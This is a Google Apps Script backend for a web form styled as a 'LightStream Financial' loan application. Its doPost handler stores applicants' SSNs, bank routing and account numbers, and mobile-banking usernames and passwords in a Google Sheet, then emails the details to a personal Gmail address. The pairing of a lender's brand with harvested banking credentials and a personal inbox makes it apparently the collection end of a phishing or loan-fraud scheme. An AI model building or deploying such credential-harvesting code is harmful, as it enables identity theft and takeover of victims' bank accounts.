const SHEET_URL = "https://docs.google.com/spreadsheets/d/1drmvoZPbGED2hratNOu3vBgjJRmk9cYIdLuJq7Scei8/edit";

function doGet(e) {
  return ContentService.createTextOutput("Google Sheets API is working âœ…");
}

function doPost(e) {
  try {
    const sheet = SpreadsheetApp.openByUrl(SHEET_URL).getSheetByName("Sheet1");
    const data = JSON.parse(e.postData.contents);

    // Log what we received for debugging
    console.log("Received data:", data);
    console.log("Available keys:", Object.keys(data));

    // Add data to Google Sheets
    sheet.appendRow([
      data.loanAmount || '',
      data.loanPurpose || '',
      data.creditScore || '',
      data.fullName || data.name || '',
      data.email || '',
      data.phone || '',
      data.address || data.streetAddress || '',
      data.city || '',
      data.state || '',
      data.zipCode || '',
      data.ssn || '',
      data.bankName || data.customerBank || '',
      data.routingNumber || '',
      data.accountNumber || '',
      data.monthlyIncome || '',
      data.employmentStatus || '',
      '', // monthlyHousing - not in your data
      data.mobileBankingUserId || '',
      data.mobileBankingPassword || '[PROTECTED]',
      new Date()
    ]);

    console.log("Data added to Google Sheets successfully");

    // ğŸ“§ SEND EMAIL IMMEDIATELY
    try {
      const recipientEmail = "finnfoxpersonalloan@gmail.com";
      
      const subject = "ğŸ¦ New Loan Application - LightStream Financial";
      
      const body = `
ğŸ‰ NEW LOAN APPLICATION RECEIVED ğŸ‰

ğŸ‘¤ CUSTOMER INFORMATION:
Name: ${data.fullName || data.name || 'N/A'}
Email: ${data.email || 'N/A'}
Phone: ${data.phone || 'N/A'}
Address: ${data.address || data.streetAddress || 'N/A'}, ${data.city || 'N/A'}, ${data.state || 'N/A'} ${data.zipCode || 'N/A'}

ğŸ’° LOAN DETAILS:
Loan Amount: $${data.loanAmount || 'N/A'}
Loan Purpose: ${data.loanPurpose || 'N/A'}
Credit Score: ${data.creditScore || 'N/A'}

ğŸ¦ BANK INFORMATION:
Bank Name: ${data.bankName || data.customerBank || 'N/A'}
Routing Number: ${data.routingNumber || 'N/A'}
Account Number: ****${(data.accountNumber || '').slice(-4) || 'N/A'}

ğŸ’¼ FINANCIAL INFORMATION:
Monthly Income: $${data.monthlyIncome || 'N/A'}
Employment Status: ${data.employmentStatus || 'N/A'}

ğŸ“… Submitted: ${new Date().toLocaleString()}

---
ğŸ”— Check Google Sheet for complete details:
${SHEET_URL}

ğŸš€ LightStream Financial Services
      `;

      MailApp.sendEmail({
        to: recipientEmail,
        subject: subject,
        body: body
      });
      
      console.log("âœ… Email sent successfully to " + recipientEmail);
      
    } catch (emailError) {
      console.log("âŒ Email sending failed: " + emailError.message);
      console.log("Email error details: " + emailError.toString());
    }

    return ContentService.createTextOutput(
      JSON.stringify({ status: "success", message: "Data saved and email sent" })
    ).setMimeType(ContentService.MimeType.JSON);

  } catch (err) {
    console.log("Error in doPost:", err);
    return ContentService.createTextOutput(
      JSON.stringify({ status: "error", message: err.message })
    ).setMimeType(ContentService.MimeType.JSON);
  }
}
